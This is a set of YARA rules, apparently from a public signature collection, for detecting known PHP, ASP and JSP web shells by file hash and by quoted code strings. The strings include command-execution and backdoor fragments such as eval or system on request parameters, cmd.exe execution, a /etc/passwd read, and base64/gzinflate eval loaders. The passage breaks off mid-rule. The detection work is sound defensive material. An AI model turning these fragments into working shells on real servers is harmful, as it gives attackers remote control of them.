rule webshell_ASP_tool {
	meta:
		description = "Web Shell - file tool.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "4ab68d38527d5834e9c1ff64407b34fb"
	strings:
		$s0 = "Response.Write \"<FORM action=\"\"\" & Request.ServerVariables(\"URL\") & \"\"\""
		$s3 = "Response.Write \"<tr><td><font face='arial' size='2'><b>&lt;DIR&gt; <a href='\" "
		$s9 = "Response.Write \"<font face='arial' size='1'><a href=\"\"#\"\" onclick=\"\"javas"
	condition:
		2 of them
}
rule webshell_cmd_win32 {
	meta:
		description = "Web Shell - file cmd_win32.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "cc4d4d6cc9a25984aa9a7583c7def174"
	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParam"
		$s1 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
	condition:
		2 of them
}
rule webshell_jsp_jshell {
	meta:
		description = "Web Shell - file jshell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "124b22f38aaaf064cef14711b2602c06"
	strings:
		$s0 = "kXpeW[\"" fullword
		$s4 = "[7b:g0W@W<" fullword
		$s5 = "b:gHr,g<" fullword
		$s8 = "RhV0W@W<" fullword
		$s9 = "S_MR(u7b" fullword
	condition:
		all of them
}
rule webshell_ASP_zehir4 {
	meta:
		description = "Web Shell - file zehir4.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "7f4e12e159360743ec016273c3b9108c"
	strings:
		$s9 = "Response.Write \"<a href='\"&dosyaPath&\"?status=7&Path=\"&Path&\"/"
	condition:
		all of them
}
rule webshell_wsb_idc {
	meta:
		description = "Web Shell - file idc.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "7c5b1b30196c51f1accbffb80296395f"
	strings:
		$s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword
		$s3 = "{eval($_GET['idc']);}" fullword
	condition:
		1 of them
}
rule webshell_cpg_143_incl_xpl {
	meta:
		description = "Web Shell - file cpg_143_incl_xpl.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5937b131b67d8e0afdbd589251a5e176"
	strings:
		$s3 = "$data=\"username=\".urlencode($USER).\"&password=\".urlencode($PA"
		$s5 = "fputs($sun_tzu,\"<?php echo \\\"Hi Master!\\\";ini_set(\\\"max_execution_time"
	condition:
		1 of them
}
rule webshell_mumaasp_com {
	meta:
		description = "Web Shell - file mumaasp.com.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "cce32b2e18f5357c85b6d20f564ebd5d"
	strings:
		$s0 = "&9K_)P82ai,A}I92]R\"q!C:RZ}S6]=PaTTR"
	condition:
		all of them
}
rule webshell_php_404 {
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ced050df5ca42064056a7ad610a191b3"
	strings:
		$s0 = "$pass = md5(md5(md5($pass)));" fullword
	condition:
		all of them
}
rule webshell_webshell_cnseay_x {
	meta:
		description = "Web Shell - file webshell-cnseay-x.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a0f9f7f5cd405a514a7f3be329f380e5"
	strings:
		$s9 = "$_F_F.='_'.$_P_P[5].$_P_P[20].$_P_P[13].$_P_P[2].$_P_P[19].$_P_P[8].$_P_"
	condition:
		all of them
}
rule webshell_asp_up {
	meta:
		description = "Web Shell - file up.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "f775e721cfe85019fe41c34f47c0d67c"
	strings:
		$s0 = "Pos = InstrB(BoundaryPos,RequestBin,getByteString(\"Content-Dispositio"
		$s1 = "ContentType = getString(MidB(RequestBin,PosBeg,PosEnd-PosBeg))" fullword
	condition:
		1 of them
}
rule webshell_phpkit_0_1a_odd {
	meta:
		description = "Web Shell - file odd.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3c30399e7480c09276f412271f60ed01"
	strings:
		$s1 = "include('php://input');" fullword
		$s3 = "ini_set('allow_url_include, 1'); // Allow url inclusion in this script" fullword
		$s4 = "// uses include('php://input') to execute arbritary code" fullword
		$s5 = "// php://input based backdoor" fullword
	condition:
		2 of them
}
rule webshell_ASP_cmd {
	meta:
		description = "Web Shell - file cmd.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "97af88b478422067f23b001dd06d56a9"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
	condition:
		all of them
}
rule webshell_PHP_Shell_x3 {
	meta:
		description = "Web Shell - file PHP Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a2f8fa4cce578fc9c06f8e674b9e63fd"
	strings:
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s6 = "echo \"</form><form action=\\\"$SFileName?$urlAdd\\\" method=\\\"post\\\"><input"
		$s9 = "if  ( ( (isset($http_auth_user) ) && (isset($http_auth_pass)) ) && ( !isset("
	condition:
		2 of them
}
rule webshell_PHP_g00nv13 {
	meta:
		description = "Web Shell - file g00nv13.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "35ad2533192fe8a1a76c3276140db820"
	strings:
		$s1 = "case \"zip\": case \"tar\": case \"malware_rar\": case \"gz\": case \"cab\": cas"
		$s4 = "if(!($sqlcon = @mysql_connect($_SESSION['sql_host'] . ':' . $_SESSION['sql_p"
	condition:
		all of them
}
rule webshell_php_h6ss {
	meta:
		description = "Web Shell - file h6ss.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "272dde9a4a7265d6c139287560328cd5"
	strings:
		$s0 = "<?php eval(gzuncompress(base64_decode(\""
	condition:
		all of them
}
rule webshell_jsp_zx {
	meta:
		description = "Web Shell - file zx.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "67627c264db1e54a4720bd6a64721674"
	strings:
		$s0 = "if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application.g"
	condition:
		all of them
}
rule webshell_Ani_Shell {
	meta:
		description = "Web Shell - file Ani-Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "889bfc9fbb8ee7832044fc575324d01a"
	strings:
		$s0 = "$Python_CODE = \"I"
		$s6 = "$passwordPrompt = \"\\n================================================="
		$s7 = "fputs ($sockfd ,\"\\n==============================================="
	condition:
		1 of them
}
rule webshell_jsp_k8cmd {
	meta:
		description = "Web Shell - file k8cmd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b39544415e692a567455ff033a97a682"
	strings:
		$s2 = "if(request.getSession().getAttribute(\"hehe\").toString().equals(\"hehe\"))" fullword
	condition:
		all of them
}
rule webshell_jsp_cmd {
	meta:
		description = "Web Shell - file cmd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5391c4a8af1ede757ba9d28865e75853"
	strings:
		$s6 = "out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");" fullword
	condition:
		all of them
}
rule webshell_jsp_k81 {
	meta:
		description = "Web Shell - file k81.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "41efc5c71b6885add9c1d516371bd6af"
	strings:
		$s1 = "byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);" fullword
		$s9 = "if(cmd.equals(\"Szh0ZWFt\")){out.print(\"[S]\"+dir+\"[E]\");}" fullword
	condition:
		1 of them
}
rule webshell_ASP_zehir {
	meta:
		description = "Web Shell - file zehir.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0061d800aee63ccaf41d2d62ec15985d"
	strings:
		$s9 = "Response.Write \"<font face=wingdings size=3><a href='\"&dosyaPath&\"?status=18&"
	condition:
		all of them
}
rule webshell_Worse_Linux_Shell {
	meta:
		description = "Web Shell - file Worse Linux Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "8338c8d9eab10bd38a7116eb534b5fa2"
	strings:
		$s0 = "system(\"mv \".$_FILES['_upl']['tmp_name'].\" \".$currentWD"
	condition:
		all of them
}
rule webshell_zacosmall {
	meta:
		description = "Web Shell - file zacosmall.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5295ee8dc2f5fd416be442548d68f7a6"
	strings:
		$s0 = "if($cmd!==''){ echo('<strong>'.htmlspecialchars($cmd).\"</strong><hr>"
	condition:
		all of them
}
rule webshell_Liz0ziM_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit {
	meta:
		description = "Web Shell - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
	strings:
		$s1 = "<option value=\"cat /etc/passwd\">/etc/passwd</option>" fullword
	condition:
		all of them
}
rule webshell_redirect {
	meta:
		description = "Web Shell - file redirect.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "97da83c6e3efbba98df270cc70beb8f8"
	strings:
		$s7 = "var flag = \"?txt=\" + (document.getElementById(\"dl\").checked ? \"2\":\"1\" "
	condition:
		all of them
}
rule webshell_jsp_cmdjsp {
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b815611cc39f17f05a73444d699341d4"
	strings:
		$s5 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
	condition:
		all of them
}
rule webshell_Java_Shell {
	meta:
		description = "Web Shell - file Java Shell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "36403bc776eb12e8b7cc0eb47c8aac83"
	strings:
		$s4 = "public JythonShell(int columns, int rows, int scrollback) {" fullword
		$s9 = "this(null, Py.getSystemState(), columns, rows, scrollback);" fullword
	condition:
		1 of them
}
rule webshell_asp_1d {
	meta:
		description = "Web Shell - file 1d.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "fad7504ca8a55d4453e552621f81563c"
	strings:
		$s0 = "+9JkskOfKhUxZJPL~\\(mD^W~[,{@#@&EO"
	condition:
		all of them
}
rule webshell_jsp_IXRbE {
	meta:
		description = "Web Shell - file IXRbE.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e26e7e0ebc6e7662e1123452a939e2cd"
	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
	condition:
		all of them
}
rule webshell_PHP_G5 {
	meta:
		description = "Web Shell - file G5.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "95b4a56140a650c74ed2ec36f08d757f"
	strings:
		$s3 = "echo \"Hacking Mode?<br><select name='htype'><option >--------SELECT--------</op"
	condition:
		all of them
}
rule webshell_PHP_r57142 {
	meta:
		description = "Web Shell - file r57142.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0911b6e6b8f4bcb05599b2885a7fe8a8"
	strings:
		$s0 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword
	condition:
		all of them
}
rule webshell_jsp_tree {
	meta:
		description = "Web Shell - file tree.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "bcdf7bbf7bbfa1ffa4f9a21957dbcdfa"
	strings:
		$s5 = "$('#tt2').tree('options').url = \"selectChild.action?checki"
		$s6 = "String basePath = request.getScheme()+\"://\"+request.getServerName()+\":\"+requ"
	condition:
		all of them
}
rule webshell_C99madShell_v_3_0_smowu {
	meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "74e1e7c7a6798f1663efb42882b85bee"
	strings:
		$s2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><for"
		$s8 = "<p><font color=red>Wordpress Not Found! <input type=text id=\"wp_pat\"><input ty"
	condition:
		1 of them
}
rule webshell_simple_backdoor {
	meta:
		description = "Web Shell - file simple-backdoor.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "f091d1b9274c881f8e41b2f96e6b9936"
	strings:
		$s0 = "$cmd = ($_REQUEST['cmd']);" fullword
		$s1 = "if(isset($_REQUEST['cmd'])){" fullword
		$s4 = "system($cmd);" fullword
	condition:
		2 of them
}
rule webshell_PHP_404 {
	meta:
		description = "Web Shell - file 404.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "078c55ac475ab9e028f94f879f548bca"
	strings:
		$s4 = "<span>Posix_getpwuid (\"Read\" /etc/passwd)"
	condition:
		all of them
}
rule webshell_Macker_s_Private_PHPShell {
	meta:
		description = "Web Shell - file Macker's Private PHPShell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e24cbf0e294da9ac2117dc660d890bb9"
	strings:
		$s3 = "echo \"<tr><td class=\\\"silver border\\\">&nbsp;<strong>Server's PHP Version:&n"
		$s4 = "&nbsp;&nbsp;<?php echo buildUrl(\"<font color=\\\"navy\\\">["
		$s7 = "echo \"<form action=\\\"$SFileName?$urlAdd\\\" method=\\\"POST\\\"><input type="
	condition:
		all of them
}
rule webshell_Antichat_Shell_v1_3_2 {
	meta:
		description = "Web Shell - file Antichat Shell v1.3.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "40d0abceba125868be7f3f990f031521"
	strings:
		$s3 = "$header='<html><head><title>'.getenv(\"HTTP_HOST\").' - Antichat Shell</title><m"
	condition:
		all of them
}
rule webshell_Safe_mode_breaker {
	meta:
		description = "Web Shell - file Safe mode breaker.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5bd07ccb1111950a5b47327946bfa194"
	strings:
		$s5 = "preg_match(\"/SAFE\\ MODE\\ Restriction\\ in\\ effect\\..*whose\\ uid\\ is("
		$s6 = "$path =\"{$root}\".((substr($root,-1)!=\"/\") ? \"/\" : NULL)."
	condition:
		1 of them
}
rule webshell_Sst_Sheller {
	meta:
		description = "Web Shell - file Sst-Sheller.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d93c62a0a042252f7531d8632511ca56"
	strings:
		$s2 = "echo \"<a href='?page=filemanager&id=fm&fchmod=$dir$file'>"
		$s3 = "<? unlink($filename); unlink($filename1); unlink($filename2); unlink($filename3)"
	condition:
		all of them
}
rule webshell_jsp_list {
	meta:
		description = "Web Shell - file list.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1ea290ff4259dcaeb680cec992738eda"
	strings:
		$s0 = "<FORM METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">" fullword
		$s2 = "out.print(\") <A Style='Color: \" + fcolor.toString() + \";' HRef='?file=\" + fn"
		$s7 = "if(flist[i].canRead() == true) out.print(\"r\" ); else out.print(\"-\");" fullword
	condition:
		all of them
}
rule webshell_PHPJackal_v1_5 {
	meta:
		description = "Web Shell - file PHPJackal v1.5.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d76dc20a4017191216a0315b7286056f"
	strings:
		$s7 = "echo \"<center>${t}MySQL cilent:</td><td bgcolor=\\\"#333333\\\"></td></tr><form"
		$s8 = "echo \"<center>${t}Wordlist generator:</td><td bgcolor=\\\"#333333\\\"></td></tr"
	condition:
		all of them
}
rule webshell_customize {
	meta:
		description = "Web Shell - file customize.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d55578eccad090f30f5d735b8ec530b1"
	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_s72_Shell_v1_1_Coding {
	meta:
		description = "Web Shell - file s72 Shell v1.1 Coding.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c2e8346a5515c81797af36e7e4a3828e"
	strings:
		$s5 = "<font face=\"Verdana\" style=\"font-size: 8pt\" color=\"#800080\">Buradan Dosya "
	condition:
		all of them
}
rule webshell_jsp_sys3 {
	meta:
		description = "Web Shell - file sys3.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b3028a854d07674f4d8a9cf2fb6137ec"
	strings:
		$s1 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">" fullword
		$s4 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859-1\""
		$s9 = "<%@page contentType=\"text/html;charset=gb2312\"%>" fullword
	condition:
		all of them
}
rule webshell_jsp_guige02 {
	meta:
		description = "Web Shell - file guige02.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a3b8b2280c56eaab777d633535baf21d"
	strings:
		$s0 = "????????????????%><html><head><title>hahahaha</title></head><body bgcolor=\"#fff"
		$s1 = "<%@page contentType=\"text/html; charset=GBK\" import=\"java.io.*;\"%><%!private"
	condition:
		all of them
}
rule webshell_php_ghost {
	meta:
		description = "Web Shell - file ghost.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "38dc8383da0859dca82cf0c943dbf16d"
	strings:
		$s1 = "<?php $OOO000000=urldecode('%61%68%36%73%62%65%68%71%6c%61%34%63%6f%5f%73%61%64'"
		$s6 = "//<img width=1 height=1 src=\"http://websafe.facaiok.com/just7z/sx.asp?u=***.***"
		$s7 = "preg_replace('\\'a\\'eis','e'.'v'.'a'.'l'.'(KmU(\"" fullword
	condition:
		all of them
}
rule webshell_WinX_Shell {
	meta:
		description = "Web Shell - file WinX Shell.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "17ab5086aef89d4951fe9b7c7a561dda"
	strings:
		$s5 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">Filenam"
		$s8 = "print \"<font face=\\\"Verdana\\\" size=\\\"1\\\" color=\\\"#990000\\\">File: </"
	condition:
		all of them
}
rule webshell_Crystal_Crystal {
	meta:
		description = "Web Shell - file Crystal.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "fdbf54d5bf3264eb1c4bff1fac548879"
	strings:
		$s1 = "show opened ports</option></select><input type=\"hidden\" name=\"cmd_txt\" value"
		$s6 = "\" href=\"?act=tools\"><font color=#CC0000 size=\"3\">Tools</font></a></span></f"
	condition:
		all of them
}
rule webshell_r57_1_4_0 {
	meta:
		description = "Web Shell - file r57.1.4.0.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "574f3303e131242568b0caf3de42f325"
	strings:
		$s4 = "@ini_set('error_log',NULL);" fullword
		$s6 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s7 = "@ini_restore(\"disable_functions\");" fullword
		$s9 = "@ini_restore(\"safe_mode_exec_dir\");" fullword
	condition:
		all of them
}
rule webshell_jsp_hsxa1 {
	meta:
		description = "Web Shell - file hsxa1.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5686d5a38c6f5b8c55095af95c2b0244"
	strings:
		$s0 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%><jsp:directive.page import=\"ja"
	condition:
		all of them
}
rule webshell_asp_ajn {
	meta:
		description = "Web Shell - file ajn.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "aaafafc5d286f0bff827a931f6378d04"
	strings:
		$s1 = "seal.write \"Set WshShell = CreateObject(\"\"WScript.Shell\"\")\" & vbcrlf" fullword
		$s6 = "seal.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreateOve"
	condition:
		all of them
}
rule webshell_php_cmd {
	meta:
		description = "Web Shell - file cmd.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "c38ae5ba61fd84f6bbbab98d89d8a346"
	strings:
		$s0 = "if($_GET['cmd']) {" fullword
		$s1 = "// cmd.php = Command Execution" fullword
		$s7 = "  system($_GET['cmd']);" fullword
	condition:
		all of them
}
rule webshell_asp_list {
	meta:
		description = "Web Shell - file list.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1cfa493a165eb4b43e6d4cc0f2eab575"
	strings:
		$s0 = "<INPUT TYPE=\"hidden\" NAME=\"type\" value=\"<%=tipo%>\">" fullword
		$s4 = "Response.Write(\"<h3>FILE: \" & file & \"</h3>\")" fullword
	condition:
		all of them
}
rule webshell_PHP_co {
	meta:
		description = "Web Shell - file co.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "62199f5ac721a0cb9b28f465a513874c"
	strings:
		$s0 = "cGX6R9q733WvRRjISKHOp9neT7wa6ZAD8uthmVJV" fullword
		$s11 = "6Mk36lz/HOkFfoXX87MpPhZzBQH6OaYukNg1OE1j" fullword
	condition:
		all of them
}
rule webshell_PHP_150 {
	meta:
		description = "Web Shell - file 150.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "400c4b0bed5c90f048398e1d268ce4dc"
	strings:
		$s0 = "HJ3HjqxclkZfp"
		$s1 = "<? eval(gzinflate(base64_decode('" fullword
	condition:
		all of them
}
rule webshell_jsp_cmdjsp_2 {
	meta:
		description = "Web Shell - file cmdjsp.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "1b5ae3649f03784e2a5073fa4d160c8b"
	strings:
		$s0 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s4 = "<FORM METHOD=GET ACTION='cmdjsp.jsp'>" fullword
	condition:
		all of them
}
rule webshell_PHP_c37 {
	meta:
		description = "Web Shell - file c37.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d01144c04e7a46870a8dd823eb2fe5c8"
	strings:
		$s3 = "array('cpp','cxx','hxx','hpp','cc','jxx','c++','vcproj'),"
		$s9 = "++$F; $File = urlencode($dir[$dirFILE]); $eXT = '.:'; if (strpos($dir[$dirFILE],"
	condition:
		all of them
}
rule webshell_PHP_b37 {
	meta:
		description = "Web Shell - file b37.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "0421445303cfd0ec6bc20b3846e30ff0"
	strings:
		$s0 = "xmg2/G4MZ7KpNveRaLgOJvBcqa2A8/sKWp9W93NLXpTTUgRc"
	condition:
		all of them
}
rule webshell_php_backdoor {
	meta:
		description = "Web Shell - file php-backdoor.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
	strings:
		$s1 = "if(!move_uploaded_file($HTTP_POST_FILES['file_name']['tmp_name'], $dir.$fname))" fullword
		$s2 = "<pre><form action=\"<? echo $PHP_SELF; ?>\" METHOD=GET >execute command: <input "
	condition:
		all of them
}
rule webshell_asp_dabao {
	meta:
		description = "Web Shell - file dabao.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3919b959e3fa7e86d52c2b0a91588d5d"
	strings:
		$s2 = " Echo \"<input type=button name=Submit onclick=\"\"document.location =&#039;\" &"
		$s8 = " Echo \"document.Frm_Pack.FileName.value=\"\"\"\"+year+\"\"-\"\"+(month+1)+\"\"-"
	condition:
		all of them
}
rule webshell_php_2 {
	meta:
		description = "Web Shell - file 2.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "267c37c3a285a84f541066fc5b3c1747"
	strings:
		$s0 = "<?php assert($_REQUEST[\"c\"]);?> " fullword
	condition:
		all of them
}
rule webshell_asp_cmdasp {
	meta:
		description = "Web Shell - file cmdasp.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "57b51418a799d2d016be546f399c2e9b"
	strings:
		$s0 = "<%= \"\\\\\" & oScriptNet.ComputerName & \"\\\" & oScriptNet.UserName %>" fullword
		$s7 = "Call oScript.Run (\"cmd.exe /c \" & szCMD & \" > \" & szTempFile, 0, True)" fullword
	condition:
		all of them
}
rule webshell_spjspshell {
	meta:
		description = "Web Shell - file spjspshell.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "d39d51154aaad4ba89947c459a729971"
	strings:
		$s7 = "Unix:/bin/sh -c tar vxf xxx.tar Windows:c:\\winnt\\system32\\cmd.exe /c type c:"
	condition:
		all of them
}
rule webshell_jsp_action {
	meta:
		description = "Web Shell - file action.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "5a7d931094f5570aaf5b7b3b06c3d8c0"
	strings:
		$s1 = "String url=\"jdbc:oracle:thin:@localhost:1521:orcl\";" fullword
		$s6 = "<%@ page contentType=\"text/html;charset=gb2312\"%>" fullword
	condition:
		all of them
}
rule webshell_Inderxer {
	meta:
		description = "Web Shell - file Inderxer.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "9ea82afb8c7070817d4cdf686abe0300"
	strings:
		$s4 = "<td>Nereye :<td><input type=\"text\" name=\"nereye\" size=25></td><td><input typ"
	condition:
		all of them
}
rule webshell_asp_Rader {
	meta:
		description = "Web Shell - file Rader.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ad1a362e0a24c4475335e3e891a01731"
	strings:
		$s1 = "FONT-WEIGHT: bold; FONT-SIZE: 10px; BACKGROUND: none transparent scroll repeat 0"
		$s3 = "m\" target=inf onClick=\"window.open('?action=help','inf','width=450,height=400 "
	condition:
		all of them
}
rule webshell_c99_madnet_smowu {
	meta:
		description = "Web Shell - file smowu.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3aaa8cad47055ba53190020311b0fb83"
	strings:
		$s0 = "//Authentication" fullword
		$s1 = "$login = \"" fullword
		$s2 = "eval(gzinflate(base64_decode('"
		$s4 = "//Pass"
		$s5 = "$md5_pass = \""
		$s6 = "//If no pass then hash"
	condition:
		all of them
}
rule webshell_php_moon {
	meta:
		description = "Web Shell - file moon.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "2a2b1b783d3a2fa9a50b1496afa6e356"
	strings:
		$s2 = "echo '<option value=\"create function backshell returns string soname"
		$s3 = "echo      \"<input name='p' type='text' size='27' value='\".dirname(_FILE_).\""
		$s8 = "echo '<option value=\"select cmdshell(\\'net user "
	condition:
		2 of them
}
rule webshell_jsp_jdbc {
	meta:
		description = "Web Shell - file jdbc.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "23b0e6f91a8f0d93b9c51a2a442119ce"
	strings:
		$s4 = "String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z"
	condition:
		all of them
}
rule webshell_minupload {
	meta:
		description = "Web Shell - file minupload.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ec905a1395d176c27f388d202375bdf9"
	strings:
		$s0 = "<input type=\"submit\" name=\"btnSubmit\" value=\"Upload\">   " fullword
		$s9 = "String path=new String(request.getParameter(\"path\").getBytes(\"ISO-8859"
	condition:
		all of them
}
rule webshell_ELMALISEKER_Backd00r {
	meta:
		description = "Web Shell - file ELMALISEKER Backd00r.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "3aa403e0a42badb2c23d4a54ef43e2f4"
	strings:
		$s0 = "response.write(\"<tr><td bgcolor=#F8F8FF><input type=submit name=cmdtxtFileOptio"
		$s2 = "if FP = \"RefreshFolder\" or request.form(\"cmdOption\")=\"DeleteFolder\" or req"
	condition:
		all of them
}
rule webshell_PHP_bug_1_ {
	meta:
		description = "Web Shell - file bug (1).php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "91c5fae02ab16d51fc5af9354ac2f015"
	strings:
		$s0 = "@include($_GET['bug']);" fullword
	condition:
		all of them
}
rule webshell_caidao_shell_hkmjj {
	meta:
		description = "Web Shell - file hkmjj.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "e7b994fe9f878154ca18b7cde91ad2d0"
	strings:
		$s6 = "codeds=\"Li#uhtxhvw+%{{%,#@%{%#wkhq#hydo#uhtxhvw+%knpmm%,#hqg#li\"  " fullword
	condition:
		all of them
}
rule webshell_jsp_asd {
	meta:
		description = "Web Shell - file asd.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "a042c2ca64176410236fcc97484ec599"
	strings:
		$s3 = "<%@ page language=\"java\" pageEncoding=\"gbk\"%>" fullword
		$s6 = "<input size=\"100\" value=\"<%=application.getRealPath(\"/\") %>\" name=\"url"
	condition:
		all of them
}
rule webshell_jsp_inback3 {
	meta:
		description = "Web Shell - file inback3.jsp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "ea5612492780a26b8aa7e5cedd9b8f4e"
	strings:
		$s0 = "<%if(request.getParameter(\"f\")!=null)(new java.io.FileOutputStream(application"
	condition:
		all of them
}
rule webshell_metaslsoft {
	meta:
		description = "Web Shell - file metaslsoft.php"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "aa328ed1476f4a10c0bcc2dde4461789"
	strings:
		$s7 = "$buff .= \"<tr><td><a href=\\\"?d=\".$pwd.\"\\\">[ $folder ]</a></td><td>LINK</t"
	condition:
		all of them
}
rule webshell_asp_Ajan {
	meta:
		description = "Web Shell - file Ajan.asp"
		author = "Florian Roth"
		date = "2014/01/28"
		score = 70
		hash = "b6f468252407efc2318639da22b08af0"
	strings:
		$s3 = "entrika.write \"BinaryStream.SaveToFile \"\"c:\\downloaded.zip\"\", adSaveCreate"
	condition:
		all of them
}
rule webshell_config_myxx_zend {
	meta:
